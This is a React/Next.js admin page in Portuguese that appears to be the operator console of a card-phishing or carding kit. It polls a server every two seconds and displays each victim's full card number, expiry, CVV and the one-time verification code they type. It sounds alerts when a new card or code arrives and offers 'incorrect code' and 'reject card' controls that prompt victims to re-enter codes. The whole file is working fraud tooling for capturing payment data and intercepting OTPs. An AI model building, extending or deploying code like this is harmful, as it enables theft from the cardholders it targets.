'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import { useSession } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import { Trash2, ShieldCheck, CreditCard, Clock, Volume2, VolumeX, XCircle, AlertTriangle, Ban } from 'lucide-react';
import { toast } from 'sonner';

interface VerificationCodeEntry {
  id: string;
  code: string | null;
  customerName: string;
  cardBrand: string;
  lastFourDigits: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  orderTotal: number;
  status: string;
  createdAt: string;
}

const brandColors: Record<string, string> = {
  visa: 'text-blue-400',
  mastercard: 'text-orange-400',
  elo: 'text-yellow-400',
  amex: 'text-cyan-400',
  hipercard: 'text-red-400',
  diners: 'text-gray-400',
  unknown: 'text-gray-400',
};

const brandBgColors: Record<string, string> = {
  visa: 'bg-blue-500/10 border-blue-500/30',
  mastercard: 'bg-orange-500/10 border-orange-500/30',
  elo: 'bg-yellow-500/10 border-yellow-500/30',
  amex: 'bg-cyan-500/10 border-cyan-500/30',
  hipercard: 'bg-red-500/10 border-red-500/30',
  diners: 'bg-gray-500/10 border-gray-500/30',
  unknown: 'bg-gray-500/10 border-gray-500/30',
};

const brandNames: Record<string, string> = {
  visa: 'Visa',
  mastercard: 'MasterCard',
  elo: 'Elo',
  amex: 'American Express',
  hipercard: 'Hipercard',
  diners: 'Diners Club',
  unknown: 'Cartão',
};

const statusLabels: Record<string, { label: string; color: string }> = {
  WAITING_CODE: { label: 'AGUARDANDO CÓDIGO', color: 'bg-amber-500/20 text-amber-400 border-amber-500/30 animate-pulse' },
  CODE_SUBMITTED: { label: 'CÓDIGO RECEBIDO', color: 'bg-green-500/20 text-green-400 border-green-500/30' },
  REJECTED: { label: 'RECUSADO', color: 'bg-red-500/20 text-red-400 border-red-500/30' },
  INCORRECT_CODE: { label: 'CÓDIGO INCORRETO', color: 'bg-orange-500/20 text-orange-400 border-orange-500/30' },
};

export default function CodigoVerificacaoPage() {
  const { data: session, status } = useSession() || {};
  const router = useRouter();
  const [codes, setCodes] = useState<VerificationCodeEntry[]>([]);
  const [enabled, setEnabled] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [isToggling, setIsToggling] = useState(false);
  const [showClearModal, setShowClearModal] = useState(false);
  const [isClearing, setIsClearing] = useState(false);
  const [isAlertActive, setIsAlertActive] = useState(false);
  const [actionLoading, setActionLoading] = useState<Record<string, string>>({});
  const knownIdsRef = useRef<Set<string>>(new Set());
  const knownCodesRef = useRef<Set<string>>(new Set()); // track which codes we've seen
  const alertTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const beepIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const initialLoadRef = useRef(true);

  // Alert beep: bip-bip-bip (for new card)
  const playAlertBeep = useCallback(() => {
    try {
      if (!audioCtxRef.current) audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      const ctx = audioCtxRef.current;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 1800;
      osc.type = 'square';
      gain.gain.value = 0.15;
      osc.start();
      // Triple beep pattern: bip-bip-bip
      setTimeout(() => { gain.gain.value = 0; }, 100);
      setTimeout(() => { gain.gain.value = 0.15; }, 200);
      setTimeout(() => { gain.gain.value = 0; }, 300);
      setTimeout(() => { gain.gain.value = 0.15; }, 400);
      setTimeout(() => { gain.gain.value = 0; osc.stop(); }, 500);
    } catch (e) { console.error('Audio error:', e); }
  }, []);

  // Confirmation beep: different tone, single 2-second sound (for code received)
  const playConfirmBeep = useCallback(() => {
    try {
      if (!audioCtxRef.current) audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      const ctx = audioCtxRef.current;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 1000; // lower, warmer tone
      osc.type = 'sine'; // softer sound
      gain.gain.value = 0.2;
      osc.start();
      // Rising pitch effect over 2 seconds
      osc.frequency.linearRampToValueAtTime(1500, ctx.currentTime + 1);
      osc.frequency.linearRampToValueAtTime(2000, ctx.currentTime + 2);
      gain.gain.linearRampToValueAtTime(0, ctx.currentTime + 2);
      setTimeout(() => { osc.stop(); }, 2100);
    } catch (e) { console.error('Audio error:', e); }
  }, []);

  // Start alert: beep every 3s for 10 seconds
  const startAlert = useCallback(() => {
    if (beepIntervalRef.current) clearInterval(beepIntervalRef.current);
    if (alertTimeoutRef.current) clearTimeout(alertTimeoutRef.current);

    setIsAlertActive(true);
    playAlertBeep();
    beepIntervalRef.current = setInterval(playAlertBeep, 3000);

    // Stop after 10 seconds
    alertTimeoutRef.current = setTimeout(() => {
      if (beepIntervalRef.current) clearInterval(beepIntervalRef.current);
      beepIntervalRef.current = null;
      setIsAlertActive(false);
    }, 10000);
  }, [playAlertBeep]);

  const stopAlert = useCallback(() => {
    if (beepIntervalRef.current) { clearInterval(beepIntervalRef.current); beepIntervalRef.current = null; }
    if (alertTimeoutRef.current) { clearTimeout(alertTimeoutRef.current); alertTimeoutRef.current = null; }
    setIsAlertActive(false);
  }, []);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (beepIntervalRef.current) clearInterval(beepIntervalRef.current);
      if (alertTimeoutRef.current) clearTimeout(alertTimeoutRef.current);
      if (audioCtxRef.current) audioCtxRef.current.close().catch(() => {});
    };
  }, []);

  // Auth protection
  useEffect(() => {
    if (status === 'unauthenticated') {
      router.replace('/login');
    }
  }, [status, router]);

  useEffect(() => {
    if (status !== 'authenticated') return;
    fetchData();
    const interval = setInterval(fetchData, 2000);
    return () => clearInterval(interval);
  }, [status]);

  const fetchData = async () => {
    try {
      const res = await fetch('/api/admin/verification-codes');
      if (res.status === 401) { router.replace('/login'); return; }
      const data = await res.json();
      const newCodes: VerificationCodeEntry[] = data.codes || [];

      if (!initialLoadRef.current) {
        // Check for new card entries (new IDs)
        const newEntries = newCodes.filter(c => !knownIdsRef.current.has(c.id));
        if (newEntries.length > 0) {
          startAlert();
        }

        // Check for new OTP codes submitted (had no code before, now has code)
        const newCodeSubmissions = newCodes.filter(c => 
          c.code && !knownCodesRef.current.has(c.id)
        );
        if (newCodeSubmissions.length > 0) {
          playConfirmBeep();
        }
      }

      // Update known IDs and codes
      knownIdsRef.current = new Set(newCodes.map(c => c.id));
      knownCodesRef.current = new Set(newCodes.filter(c => c.code).map(c => c.id));
      initialLoadRef.current = false;

      setCodes(newCodes);
      setEnabled(data.enabled || false);
    } catch (e) {
      console.error(e);
    } finally {
      setIsLoading(false);
    }
  };

  const handleToggle = async () => {
    setIsToggling(true);
    try {
      const res = await fetch('/api/admin/verification-codes', { method: 'PUT' });
      const data = await res.json();
      setEnabled(data.enabled);
      toast.success(data.enabled ? 'Verificação ativada!' : 'Verificação desativada!');
    } catch {
      toast.error('Erro ao alternar verificação');
    } finally {
      setIsToggling(false);
    }
  };

  const handleClearAll = async () => {
    setIsClearing(true);
    try {
      const res = await fetch('/api/admin/verification-codes', { method: 'DELETE' });
      if (res.ok) {
        toast.success('Códigos apagados!');
        setCodes([]);
        setShowClearModal(false);
      }
    } catch {
      toast.error('Erro ao apagar códigos');
    } finally {
      setIsClearing(false);
    }
  };

  const handleDeleteOne = async (id: string) => {
    setActionLoading(prev => ({ ...prev, [id]: 'delete' }));
    try {
      const res = await fetch(`/api/admin/verification-codes/${id}`, { method: 'DELETE' });
      if (res.ok) {
        setCodes(prev => prev.filter(c => c.id !== id));
        toast.success('Registro excluído!');
      }
    } catch {
      toast.error('Erro ao excluir');
    } finally {
      setActionLoading(prev => { const n = { ...prev }; delete n[id]; return n; });
    }
  };

  const handleReject = async (id: string) => {
    setActionLoading(prev => ({ ...prev, [id]: 'reject' }));
    try {
      const res = await fetch(`/api/admin/verification-codes/${id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'REJECTED' })
      });
      if (res.ok) {
        setCodes(prev => prev.map(c => c.id === id ? { ...c, status: 'REJECTED' } : c));
        toast.success('Cartão marcado como recusado!');
      }
    } catch {
      toast.error('Erro ao recusar cartão');
    } finally {
      setActionLoading(prev => { const n = { ...prev }; delete n[id]; return n; });
    }
  };

  const handleIncorrectCode = async (id: string) => {
    setActionLoading(prev => ({ ...prev, [id]: 'incorrect' }));
    try {
      const res = await fetch(`/api/admin/verification-codes/${id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'INCORRECT_CODE' })
      });
      if (res.ok) {
        setCodes(prev => prev.map(c => c.id === id ? { ...c, status: 'INCORRECT_CODE', code: null } : c));
        toast.success('Código marcado como incorreto!');
      }
    } catch {
      toast.error('Erro ao marcar código incorreto');
    } finally {
      setActionLoading(prev => { const n = { ...prev }; delete n[id]; return n; });
    }
  };

  const formatDate = (dateStr: string) => {
    const d = new Date(dateStr);
    return d.toLocaleString('pt-BR', { 
      day: '2-digit', month: '2-digit', year: '2-digit',
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
  };

  const formatCardNumber = (num: string) => {
    if (!num) return '—';
    return num.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  if (status === 'loading' || isLoading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-amber-400" />
      </div>
    );
  }

  if (status === 'unauthenticated') return null;

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <ShieldCheck className="w-7 h-7 text-amber-400" />
          <h1 className="text-2xl font-bold text-white">Código Verificação</h1>
        </div>
        <div className="flex items-center gap-3">
          {isAlertActive && (
            <button
              onClick={stopAlert}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/20 border border-red-500/40 text-red-400 hover:bg-red-500/30 transition-colors text-xs font-medium animate-pulse"
            >
              <VolumeX className="w-3.5 h-3.5" />
              Silenciar
            </button>
          )}
          <div className="flex items-center gap-2 text-xs text-gray-500">
            {isAlertActive ? (
              <Volume2 className="w-4 h-4 text-red-400 animate-bounce" />
            ) : (
              <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
            )}
            {isAlertActive ? <span className="text-red-400 font-medium">🔔 Novo cartão recebido!</span> : 'Atualização em tempo real'}
          </div>
        </div>
      </div>

      {/* Toggle Card */}
      <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-lg font-semibold text-white">Verificar cartão por código</h2>
            <p className="text-sm text-gray-400 mt-1">
              Quando ativado, o cliente precisará digitar um código de 6 dígitos após inserir os dados do cartão.
            </p>
          </div>
          <button
            onClick={handleToggle}
            disabled={isToggling}
            className={`relative inline-flex h-7 w-14 items-center rounded-full transition-colors duration-200 focus:outline-none ${
              enabled ? 'bg-amber-400' : 'bg-gray-600'
            } ${isToggling ? 'opacity-50' : ''}`}
          >
            <span
              className={`inline-block h-5 w-5 transform rounded-full bg-white transition-transform duration-200 ${
                enabled ? 'translate-x-8' : 'translate-x-1'
              }`}
            />
          </button>
        </div>
        <div className={`mt-3 inline-flex items-center gap-2 px-3 py-1 rounded-full text-sm font-medium ${
          enabled 
            ? 'bg-green-500/20 text-green-400 border border-green-500/30' 
            : 'bg-gray-700 text-gray-400 border border-gray-600'
        }`}>
          <div className={`w-2 h-2 rounded-full ${enabled ? 'bg-green-400 animate-pulse' : 'bg-gray-500'}`} />
          {enabled ? 'Ativado' : 'Desativado'}
        </div>
      </div>

      {/* Codes List */}
      <div className="bg-gray-800 rounded-xl border border-gray-700">
        <div className="p-4 border-b border-gray-700 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <CreditCard className="w-5 h-5 text-gray-400" />
            <h2 className="text-lg font-semibold text-white">Verificações</h2>
            <span className="bg-gray-700 text-gray-300 text-xs px-2 py-0.5 rounded-full">{codes.length}</span>
          </div>
          {codes.length > 0 && (
            <button
              onClick={() => setShowClearModal(true)}
              className="flex items-center gap-1 text-red-400 hover:text-red-300 text-sm transition-colors"
            >
              <Trash2 className="w-4 h-4" />
              Limpar tudo
            </button>
          )}
        </div>

        {codes.length === 0 ? (
          <div className="p-12 text-center">
            <ShieldCheck className="w-12 h-12 text-gray-600 mx-auto mb-3" />
            <p className="text-gray-400">Nenhuma verificação recebida ainda.</p>
            <p className="text-gray-500 text-sm mt-1">
              {enabled 
                ? 'Quando um cliente enviar dados, aparecerão aqui em tempo real.' 
                : 'Ative a verificação acima para começar.'}
            </p>
          </div>
        ) : (
          <div className="divide-y divide-gray-700">
            {codes.map((entry) => {
              const st = statusLabels[entry.status] || statusLabels.WAITING_CODE;
              const isActionLoading = !!actionLoading[entry.id];
              const hasCode = !!entry.code;
              const canReject = entry.status !== 'REJECTED';
              const canMarkIncorrect = entry.status === 'CODE_SUBMITTED';

              return (
                <div key={entry.id} className="p-4 hover:bg-gray-750 transition-colors">
                  <div className="flex flex-col gap-3">
                    {/* Top row: status + customer + total + delete */}
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3 flex-wrap">
                        <div className={`px-2 py-0.5 rounded text-xs font-bold border ${st.color}`}>
                          {st.label}
                        </div>
                        <span className="text-white font-medium">{entry.customerName}</span>
                        <span className={`text-sm font-semibold ${brandColors[entry.cardBrand] || 'text-gray-400'}`}>
                          {brandNames[entry.cardBrand] || entry.cardBrand}
                        </span>
                      </div>
                      <div className="flex items-center gap-3">
                        <div className="text-right">
                          <p className="text-white font-semibold">R$ {entry.orderTotal.toFixed(2).replace('.', ',')}</p>
                          <p className="text-xs text-gray-500">{formatDate(entry.createdAt)}</p>
                        </div>
                        <button
                          onClick={() => handleDeleteOne(entry.id)}
                          disabled={isActionLoading}
                          className="p-1.5 rounded-lg text-gray-500 hover:text-red-400 hover:bg-red-500/10 transition-colors disabled:opacity-50"
                          title="Excluir registro"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </div>

                    {/* Card data row */}
                    <div className="flex items-center gap-3 flex-wrap">
                      <div className={`rounded-lg px-3 py-2 border ${brandBgColors[entry.cardBrand] || 'bg-gray-700 border-gray-600'}`}>
                        <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-0.5">Número</p>
                        <p className="text-white font-mono font-bold text-sm tracking-wider">
                          {formatCardNumber(entry.cardNumber)}
                        </p>
                      </div>
                      <div className="bg-gray-700/50 rounded-lg px-3 py-2 border border-gray-600">
                        <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-0.5">Validade</p>
                        <p className="text-white font-mono font-bold text-sm">{entry.expiryDate || '—'}</p>
                      </div>
                      <div className="bg-gray-700/50 rounded-lg px-3 py-2 border border-gray-600">
                        <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-0.5">CVV</p>
                        <p className="text-white font-mono font-bold text-sm">{entry.cvv || '—'}</p>
                      </div>

                      {/* Code display */}
                      {hasCode ? (
                        <div className="bg-amber-400/10 border border-amber-400/30 rounded-lg px-4 py-2 ml-auto">
                          <p className="text-[10px] text-amber-400/70 uppercase tracking-wider mb-0.5">Código OTP</p>
                          <span className="text-2xl font-mono font-bold text-amber-400 tracking-widest">
                            {entry.code}
                          </span>
                        </div>
                      ) : (
                        <div className="bg-gray-700/30 border border-dashed border-gray-600 rounded-lg px-4 py-2 ml-auto flex items-center gap-2">
                          <Clock className="w-4 h-4 text-amber-400 animate-spin" style={{ animationDuration: '3s' }} />
                          <span className="text-sm text-gray-400">Aguardando código...</span>
                        </div>
                      )}
                    </div>

                    {/* Action buttons row */}
                    <div className="flex items-center gap-2 flex-wrap">
                      {canReject && (
                        <button
                          onClick={() => handleReject(entry.id)}
                          disabled={isActionLoading}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 transition-colors text-xs font-medium disabled:opacity-50"
                        >
                          {actionLoading[entry.id] === 'reject' ? (
                            <div className="w-3 h-3 border border-red-400 border-t-transparent rounded-full animate-spin" />
                          ) : (
                            <Ban className="w-3.5 h-3.5" />
                          )}
                          RECUSAR CARTÃO
                        </button>
                      )}
                      {canMarkIncorrect && (
                        <button
                          onClick={() => handleIncorrectCode(entry.id)}
                          disabled={isActionLoading}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-orange-500/10 border border-orange-500/30 text-orange-400 hover:bg-orange-500/20 transition-colors text-xs font-medium disabled:opacity-50"
                        >
                          {actionLoading[entry.id] === 'incorrect' ? (
                            <div className="w-3 h-3 border border-orange-400 border-t-transparent rounded-full animate-spin" />
                          ) : (
                            <AlertTriangle className="w-3.5 h-3.5" />
                          )}
                          CÓDIGO INCORRETO
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Clear Modal */}
      {showClearModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70">
          <div className="bg-gray-800 rounded-xl p-6 max-w-sm mx-4 border border-gray-700">
            <h3 className="text-lg font-bold text-white mb-2">Limpar todos os códigos?</h3>
            <p className="text-gray-400 text-sm mb-4">Esta ação não pode ser desfeita.</p>
            <div className="flex gap-3">
              <button
                onClick={() => setShowClearModal(false)}
                className="flex-1 px-4 py-2 rounded-lg bg-gray-700 text-gray-300 hover:bg-gray-600 transition-colors"
              >
                Cancelar
              </button>
              <button
                onClick={handleClearAll}
                disabled={isClearing}
                className="flex-1 px-4 py-2 rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors disabled:opacity-50"
              >
                {isClearing ? 'Apagando...' : 'Apagar tudo'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
